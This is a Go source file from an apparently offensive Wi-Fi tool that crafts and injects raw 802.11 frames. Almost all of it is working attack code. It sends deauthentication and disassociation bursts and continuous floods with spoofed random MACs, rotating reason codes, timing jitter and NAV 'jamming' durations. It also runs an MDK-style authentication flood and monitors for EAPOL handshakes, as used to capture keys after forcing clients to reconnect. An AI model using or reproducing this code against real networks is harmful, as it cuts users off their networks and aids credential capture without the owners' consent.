package sniffer

import (
	"bytes"
	"context"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/lcalzada-xor/wmap/internal/core/domain"
)

// execCommand allows mocking in tests
var execCommand = exec.Command

// Injector handles active packet injection.
// Injector handles active packet injection.
type Injector struct {
	mechanism PacketInjector
	Handle    *pcap.Handle // Kept for Monitor usage, but injection should use mechanism
	Interface string
	mu        sync.Mutex
	seq       uint16
}

// randomMAC generates a random unicast MAC address
func randomMAC() net.HardwareAddr {
	buf := make([]byte, 6)
	rand.Read(buf)
	// Set locally administered bit (bit 1 of first byte) and unset multicast bit (bit 0)
	buf[0] = (buf[0] | 0x02) & 0xfe
	return net.HardwareAddr(buf)
}

// NewInjector creates a new Injector.
func NewInjector(iface string) (*Injector, error) {
	// 1. Monitor Handle (PCAP) - Always needed for watching packets
	handle, err := pcap.OpenLive(iface, 65536, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("monitor handle: %w", err)
	}

	// 2. Injection Mechanism (Raw Socket preference)
	// Try Raw first (Linux)
	var mech PacketInjector
	mech, err = NewRawInjector(iface)
	if err != nil {
		log.Printf("Raw injection unavailable (%v), falling back to PCAP", err)
		// Fallback to PCAP Injector
		mech, err = NewPcapInjector(iface)
		if err != nil {
			handle.Close()
			return nil, fmt.Errorf("injection init failed: %w", err)
		}
	} else {
		log.Printf("Using Raw Socket Injection on %s", iface)
	}

	return &Injector{
		Handle:    handle,
		mechanism: mech,
		Interface: iface,
		seq:       uint16(rand.Intn(4096)),
	}, nil
}

// StartMonitor starts a background packet listener to detect effectiveness events.
// It sends events ("handshake", "probe") to the provided channel.
// StartMonitor starts a background packet listener to detect effectiveness events.
// It opens a separate pcap handle to avoid concurrent usage issues with the injection handle.
func (i *Injector) StartMonitor(ctx context.Context, targetMAC string, events chan<- string) {
	// Open a new handle for monitoring
	monitorHandle, err := pcap.OpenLive(i.Interface, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Printf("Monitor: Failed to open handle on %s: %v", i.Interface, err)
		return
	}
	defer monitorHandle.Close()

	// Filter: (EAPOL) OR (Probe Request from Target) OR (Data from Target)
	// EAPOL: ether proto 0x888e
	// ProbeReq: type mgt subtype probe-req and wlan.sa == targetMAC
	// Data: type data and wlan.sa == targetMAC
	filter := fmt.Sprintf("(ether proto 0x888e) or (type mgt subtype probe-req and wlan addr2 %s) or (type data and wlan addr2 %s)", targetMAC, targetMAC)

	if err := monitorHandle.SetBPFFilter(filter); err != nil {
		log.Printf("Monitor: Failed to set BPF filter: %v", err)
		return
	}

	source := gopacket.NewPacketSource(monitorHandle, monitorHandle.LinkType())
	packets := source.Packets()

	log.Printf("Monitor: Started listening for events on %s (Filter: %s)", targetMAC, filter)

	// Silence Detection State
	lastDataTime := time.Time{}
	hasSeenData := false
	silenceThreshold := 3 * time.Second
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			// Check for silence only if we have seen data before (to avoid false positives on start)
			if hasSeenData && !lastDataTime.IsZero() {
				if time.Since(lastDataTime) > silenceThreshold {
					select {
					case events <- "disconnected":
						// Reset to avoid spamming the event
						hasSeenData = false
					default:
					}
				}
			}
		case packet, ok := <-packets:
			if !ok {
				return
			}

			// Check packet type
			// basic check if it's EAPOL
			if layer := packet.Layer(layers.LayerTypeEAPOL); layer != nil {
				select {
				case events <- "handshake":
				default:
				}
				log.Printf("Monitor: Detected HANDSHAKE for %s", targetMAC)
				continue
			}

			if dot11Layer := packet.Layer(layers.LayerTypeDot11); dot11Layer != nil {
				dot11, _ := dot11Layer.(*layers.Dot11)

				// Check for Data Frames (Activity)
				if dot11.Type.MainType() == layers.Dot11TypeData {
					// Verify source is target (should be covered by BPF but good to be safe)
					if bytes.Equal(dot11.Address2, net.HardwareAddr(targetMAC)) {
						lastDataTime = time.Now()
						if !hasSeenData {
							hasSeenData = true
							log.Printf("Monitor: Target %s is ACTIVE (Data detected)", targetMAC)
						}
					}
				}

				// Monitor Self-Injection (Loopback validation)
				if dot11.Type == layers.Dot11TypeMgmtDeauthentication {
					if bytes.Equal(dot11.Address2, net.HardwareAddr(targetMAC)) {
						// log.Printf("Monitor: Loopsback saw deauth from %s", targetMAC)
					}
				}

				if dot11.Type == layers.Dot11TypeMgmtProbeReq {
					select {
					case events <- "probe":
					default:
					}
				}
			}
		}
	}
}

// BroadcastProbe sends a Probe Request to the broadcast address.
func (i *Injector) BroadcastProbe(ssid string) error {
	i.mu.Lock()
	defer i.mu.Unlock()

	// 1. RadioTap Header (Standard 802.11 monitor mode header)
	// We use a minimal header. Drivers usually overwrite rate/flags.
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate,
		Rate:    5, // 2.5 Mbps (placeholder)
	}

	// 2. Dot11 Header (Management Frame, Probe Request)
	// Type: Management (00), Subtype: Probe Request (0100 -> 4)
	srcMAC, _ := net.ParseMAC("02:00:00:00:01:00") // Randomized locally administered
	dstMAC, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff") // Broadcast
	bssid, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")  // Broadcast BSSID

	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtProbeReq,
		Address1:       dstMAC,
		Address2:       srcMAC,
		Address3:       bssid,
		SequenceNumber: i.seq, // Use internal sequence
	}
	i.seq++

	// 3. Management Layer (Empty for gopacket, just acts as layer type holder)
	// We don't strictly need layers.Dot11MgmtProbeReq because it has no fields,
	// but providing it helps gopacket set the layer type correctly if we were parsing.
	// For serialization, Dot11 layer handles the Type/Subtype fields.

	// 4. Payload (Information Elements)
	// We must manually construct the tags:
	// - SSID (Tag 0)
	// - Supported Rates (Tag 1)
	// - DS Parameter Set (Tag 3) - Channel (Optional but good) to prevent channel hop issues?
	// - Extended Supported Rates (Tag 50)

	payload := []byte{}

	// Tag 0: SSID
	ssidBytes := []byte(ssid)
	payload = append(payload, 0, byte(len(ssidBytes)))
	payload = append(payload, ssidBytes...)

	// Tag 1: Supported Rates (1, 2, 5.5, 11 Mbps basic)
	// 0x82 (1), 0x84 (2), 0x8b (5.5), 0x96 (11) - MSB set means "Basic/Required" rate
	rates := []byte{0x82, 0x84, 0x8b, 0x96}
	payload = append(payload, 1, byte(len(rates)))
	payload = append(payload, rates...)

	// Tag 50: Extended Supported Rates (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
	extRates := []byte{0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c}
	payload = append(payload, 50, byte(len(extRates)))
	payload = append(payload, extRates...)

	// Serialize
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true, // GoPacket calculates FCS (CRC32) at end of Dot11
	}

	if err := gopacket.SerializeLayers(buf, opts,
		radiotap,
		dot11,
		gopacket.Payload(payload),
	); err != nil {
		return fmt.Errorf("serialize probe failed: %w", err)
	}

	if err := i.Handle.WritePacketData(buf.Bytes()); err != nil {
		return fmt.Errorf("inject probe failed: %w", err)
	}

	return nil
}

// serializeDeauthPacket helper to generate packet bytes
func (i *Injector) serializeDeauthPacket(targetMAC, senderMAC, bssid net.HardwareAddr, reasonCode uint16, seq uint16) ([]byte, error) {
	// Construct RadioTap header
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate | layers.RadioTapPresentFlags,
		Rate:    5,
		Flags:   0x0008, // No ACK (Fire and Forget)
	}

	// Construct Dot11 header for deauth frame
	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtDeauthentication,
		Address1:       targetMAC, // Destination (receiver)
		Address2:       senderMAC, // Source (sender)
		Address3:       bssid,     // BSSID
		SequenceNumber: seq,       // Dynamic Sequence Number
		DurationID:     0x1388,    // 5000us (Virtual Jamming / NAV Hack)
	}

	// Deauth management frame with reason code
	deauth := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11Reason(reasonCode),
	}

	// Serialize the packet
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, radiotap, dot11, deauth); err != nil {
		return nil, fmt.Errorf("failed to serialize deauth packet: %w", err)
	}

	return buf.Bytes(), nil
}

// serializeDisassocPacket helper to generate Disassociation packet bytes
func (i *Injector) serializeDisassocPacket(targetMAC, senderMAC, bssid net.HardwareAddr, reasonCode uint16, seq uint16) ([]byte, error) {
	// Construct RadioTap header (Same optimizations: No-ACK)
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate | layers.RadioTapPresentFlags,
		Rate:    5,
		Flags:   0x0008, // No ACK
	}

	// Construct Dot11 header for Disassoc frame
	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtDisassociation,
		Address1:       targetMAC, // Destination (receiver)
		Address2:       senderMAC, // Source (sender)
		Address3:       bssid,     // BSSID
		SequenceNumber: seq,       // Dynamic Sequence Number
		DurationID:     0x1388,    // 5000us (NAV Jamming)
	}

	// Disassociation management frame
	disassoc := &layers.Dot11MgmtDisassociation{
		Reason: layers.Dot11Reason(reasonCode),
	}

	// Serialize
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, radiotap, dot11, disassoc); err != nil {
		return nil, fmt.Errorf("failed to serialize disassoc packet: %w", err)
	}

	return buf.Bytes(), nil
}

// SendDeauthPacket sends a single deauthentication frame
// Kept for backward compatibility or single-shot use
func (i *Injector) SendDeauthPacket(targetMAC, senderMAC net.HardwareAddr, reasonCode uint16) error {
	i.mu.Lock()
	defer i.mu.Unlock()

	packetData, err := i.serializeDeauthPacket(targetMAC, senderMAC, senderMAC, reasonCode, i.seq)
	i.seq++
	if err != nil {
		return err
	}

	// Inject the packet
	if err := i.mechanism.Inject(packetData); err != nil {
		return fmt.Errorf("failed to inject deauth packet: %w", err)
	}

	return nil
}

// SendDeauthBurst sends multiple deauth packets according to the config
func (i *Injector) SendDeauthBurst(config domain.DeauthAttackConfig) error {
	// Optimize interface for robustness
	i.OptimizeInterfaceForInjection()

	targetMAC, err := net.ParseMAC(config.TargetMAC)
	if err != nil {
		return fmt.Errorf("invalid target MAC: %w", err)
	}

	var clientMAC net.HardwareAddr
	if config.ClientMAC != "" {
		clientMAC, err = net.ParseMAC(config.ClientMAC)
		if err != nil {
			return fmt.Errorf("invalid client MAC: %w", err)
		}
	}

	count := config.PacketCount
	if count <= 0 {
		count = 10 // Default burst size
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 100 * time.Millisecond
	}

	// Pre-calculation of packets
	broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")
	// Optimized Reason Codes (Psychological Warfare):
	// 7: Class 3 frame received from nonassociated STA (Aggressive)
	// 6: Class 2 frame received from nonauthenticated STA
	// 2: Previous authentication no longer valid (Simulates auth error)
	fuzzCodes := []uint16{7, 6, 2}

	// Jitter Calculation Helper
	getSleepDuration := func() time.Duration {
		if !config.UseJitter {
			return interval
		}
		// Jitter +/- 20%
		jitter := time.Duration(rand.Intn(int(interval)/5*2+1)) - interval/5
		return interval + jitter
	}

	fuzzIdx := 0
	i.mu.Lock() // Hold lock for the entire burst injection
	defer i.mu.Unlock()

	for j := 0; j < count; j++ {
		currentReason := config.ReasonCode
		if config.UseReasonFuzzing {
			currentReason = fuzzCodes[fuzzIdx]
			fuzzIdx = (fuzzIdx + 1) % len(fuzzCodes)
		}

		// Determine MACs (Real or Spoofed)
		txMAC_AP := targetMAC
		txMAC_Client := clientMAC
		if config.SpoofSource {
			txMAC_AP = randomMAC()
			txMAC_Client = randomMAC()
		}

		var pkt []byte
		var err error

		// "The Combo": 3 Deauths, then 1 Disassoc
		useDisassoc := (j+1)%4 == 0

		// Generate Packet on the fly with fresh Sequence Number
		switch config.AttackType {
		case domain.DeauthBroadcast:
			if useDisassoc {
				pkt, _ = i.serializeDisassocPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, i.seq)
			} else {
				pkt, _ = i.serializeDeauthPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, i.seq)
			}
			i.seq++
			if pkt != nil {
				err = i.mechanism.Inject(pkt)
			}
		case domain.DeauthUnicast:
			if len(clientMAC) > 0 {
				if useDisassoc {
					pkt, _ = i.serializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, i.seq)
				} else {
					pkt, _ = i.serializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, i.seq)
				}
				i.seq++
				if pkt != nil {
					err = i.mechanism.Inject(pkt)
				}
			}
		case domain.DeauthTargeted:
			if len(clientMAC) > 0 {
				// 1. AP -> Client
				var pkt1 []byte
				if useDisassoc {
					pkt1, _ = i.serializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, i.seq)
				} else {
					pkt1, _ = i.serializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, i.seq)
				}
				i.seq++

				// 2. Client -> AP
				var pkt2 []byte
				if useDisassoc {
					pkt2, _ = i.serializeDisassocPacket(targetMAC, txMAC_Client, targetMAC, currentReason, i.seq)
				} else {
					pkt2, _ = i.serializeDeauthPacket(targetMAC, txMAC_Client, targetMAC, currentReason, i.seq)
				}
				i.seq++ // Increment again for second packet

				if pkt1 != nil {
					i.mechanism.Inject(pkt1)
				}
				if pkt2 != nil {
					err = i.mechanism.Inject(pkt2)
				}
			}
		}

		if err != nil {
			log.Printf("Failed to inject packet in burst: %v", err)
		}

		if j < count-1 {
			// Briefly unlock to allow other routines or just sleep
			// Optimization: Don't unlock if just sleeping to hold the device?
			// But we need to sleep
			i.mu.Unlock()
			time.Sleep(getSleepDuration())
			i.mu.Lock()
		}
	}

	return nil
}

// StartContinuousDeauth starts a continuous deauth attack until context is cancelled
func (i *Injector) StartContinuousDeauth(ctx context.Context, config domain.DeauthAttackConfig, statusChan chan<- domain.DeauthAttackStatus) error {
	// Optimize interface for robustness (Low 'n Slow)
	i.OptimizeInterfaceForInjection()

	targetMAC, err := net.ParseMAC(config.TargetMAC)
	if err != nil {
		return fmt.Errorf("invalid target MAC: %w", err)
	}

	var clientMAC net.HardwareAddr
	if config.ClientMAC != "" {
		clientMAC, err = net.ParseMAC(config.ClientMAC)
		if err != nil {
			return fmt.Errorf("invalid client MAC: %w", err)
		}
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 100 * time.Millisecond
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	packetsSent := 0
	broadcast, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")

	// Optimized Reason Codes (Psychological Warfare):
	fuzzCodes := []uint16{7, 6, 2}
	fuzzIdx := 0

	// Jitter Function
	getSleepDuration := func() time.Duration {
		if !config.UseJitter {
			return interval
		}
		jitter := time.Duration(rand.Intn(int(interval)/5*2+1)) - interval/5
		return interval + jitter
	}

	for {
		select {
		case <-ctx.Done():
			return nil
		default:
			i.mu.Lock()
			currentReason := config.ReasonCode
			if config.UseReasonFuzzing {
				currentReason = fuzzCodes[fuzzIdx]
				fuzzIdx = (fuzzIdx + 1) % len(fuzzCodes)
			}

			// Determine MACs (Real or Spoofed) - re-roll every packet if spoofing
			txMAC_AP := targetMAC
			txMAC_Client := clientMAC
			if config.SpoofSource {
				txMAC_AP = randomMAC()
				txMAC_Client = randomMAC()
			}

			var err error
			sent := false

			// "The Combo": 3 Deauths, then 1 Disassoc
			// We use packetsSent to allow the ratio to persist across loops
			useDisassoc := (packetsSent+1)%4 == 0

			switch config.AttackType {
			case domain.DeauthBroadcast:
				var pkt []byte
				if useDisassoc {
					pkt, _ = i.serializeDisassocPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, i.seq)
				} else {
					pkt, _ = i.serializeDeauthPacket(broadcast, txMAC_AP, txMAC_AP, currentReason, i.seq)
				}
				i.seq++
				if pkt != nil {
					err = i.Handle.WritePacketData(pkt)
					if err == nil {
						sent = true
					}
				}
			case domain.DeauthUnicast:
				if len(clientMAC) > 0 {
					var pkt []byte
					if useDisassoc {
						pkt, _ = i.serializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, i.seq)
					} else {
						pkt, _ = i.serializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, i.seq)
					}
					i.seq++
					if pkt != nil {
						err = i.Handle.WritePacketData(pkt)
						if err == nil {
							sent = true
						}
					}
				}
			case domain.DeauthTargeted:
				if len(clientMAC) > 0 {
					var pkt1, pkt2 []byte
					if useDisassoc {
						pkt1, _ = i.serializeDisassocPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, i.seq)
						i.seq++ // seq increment for next packet
						pkt2, _ = i.serializeDisassocPacket(targetMAC, txMAC_Client, targetMAC, currentReason, i.seq)
					} else {
						pkt1, _ = i.serializeDeauthPacket(clientMAC, txMAC_AP, txMAC_AP, currentReason, i.seq)
						i.seq++ // seq increment for next packet
						pkt2, _ = i.serializeDeauthPacket(targetMAC, txMAC_Client, targetMAC, currentReason, i.seq)
					}
					i.seq++

					if pkt1 != nil {
						if e := i.Handle.WritePacketData(pkt1); e == nil {
							sent = true
						} else {
							err = e
						}
					}
					if pkt2 != nil {
						if e := i.Handle.WritePacketData(pkt2); e == nil {
							sent = true
						} else {
							err = e
						}
					}
				}
			}

			if sent {
				packetsSent++
			}

			if err != nil {
				log.Printf("Failed to inject packet in continuous: %v", err)
			}
			i.mu.Unlock()

			// Send status update every 10 packets
			if packetsSent%10 == 0 && statusChan != nil {
				select {
				case statusChan <- domain.DeauthAttackStatus{
					PacketsSent: packetsSent,
					Status:      domain.AttackRunning,
				}:
				default:
				}
			}

			time.Sleep(getSleepDuration())
		}
	}
}

// serializeAuthPacket helper to generate authentication frame
func (i *Injector) serializeAuthPacket(targetMAC, senderMAC net.HardwareAddr, seq uint16) ([]byte, error) {
	// 1. RadioTap Header
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate | layers.RadioTapPresentFlags,
		Rate:    5,
		Flags:   0x0008, // No ACK (Fire and Forget)
	}

	// 2. Dot11 Header (Authentication)
	// Type: Management (00), Subtype: Authentication (1011 -> 11)
	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtAuthentication,
		Address1:       targetMAC, // Destination (AP)
		Address2:       senderMAC, // Source (Spoofed Client)
		Address3:       targetMAC, // BSSID (AP)
		SequenceNumber: seq,
	}

	// 3. Authentication Body
	// Alg: Open System (0), Seq: 1, Status: 0 (Success/Request)
	auth := &layers.Dot11MgmtAuthentication{
		Algorithm: 0, // Open System
		Sequence:  1, // 1 = Request
		Status:    0, // Reserved/Success
	}

	// Serialize
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, radiotap, dot11, auth); err != nil {
		return nil, fmt.Errorf("serialize auth failed: %w", err)
	}

	return buf.Bytes(), nil
}

// OptimizeInterfaceForInjection configures the interface for "Low 'n Slow" injection
// by forcing legacy 802.11b (2.4GHz) and 802.11a (5GHz) bitrates to improve range and robustness.
func (i *Injector) OptimizeInterfaceForInjection() {
	cmd := execCommand("iw", "dev", i.Interface, "set", "bitrates", "legacy-2.4", "1", "2", "5.5", "11", "legacy-5", "6", "9", "12")
	if err := cmd.Run(); err != nil {
		log.Printf("Warning: Failed to optimize bitrate for %s: %v", i.Interface, err)
	} else {
		log.Printf("Interface %s optimized for robust injection (Legacy 2.4/5GHz)", i.Interface)
	}
}

// StartAuthFlood starts an Authentication Flood attack (MDK style)
func (i *Injector) StartAuthFlood(ctx context.Context, config domain.AuthFloodAttackConfig, statusChan chan<- domain.AuthFloodAttackStatus) error {
	// Optimize interface for robustness (Low 'n Slow)
	i.OptimizeInterfaceForInjection()

	targetMAC, err := net.ParseMAC(config.TargetBSSID)
	if err != nil {
		return fmt.Errorf("invalid target BSSID: %w", err)
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 10 * time.Millisecond // High speed for flood
	}

	packetsSent := 0

	for {
		select {
		case <-ctx.Done():
			return nil
		default:
			i.mu.Lock()

			// Generate random source MAC for every packet (MDK Style)
			srcMAC := randomMAC()

			// Serialize and Inject
			pkt, err := i.serializeAuthPacket(targetMAC, srcMAC, 0)
			if err == nil {
				if err := i.mechanism.Inject(pkt); err == nil {
					packetsSent++
				} else {
					log.Printf("Failed to inject auth packet: %v", err)
				}
			} else {
				log.Printf("Failed to serialize auth packet: %v", err)
			}

			i.mu.Unlock()

			// Status Update
			if packetsSent%50 == 0 && statusChan != nil {
				select {
				case statusChan <- domain.AuthFloodAttackStatus{
					PacketsSent: packetsSent,
					Status:      domain.AttackRunning,
				}:
				default:
				}
			}

			// Check limit
			if config.PacketCount > 0 && packetsSent >= config.PacketCount {
				return nil
			}

			time.Sleep(interval)
		}
	}
}

func (i *Injector) Close() {
	if i.Handle != nil {
		i.Handle.Close()
	}
}
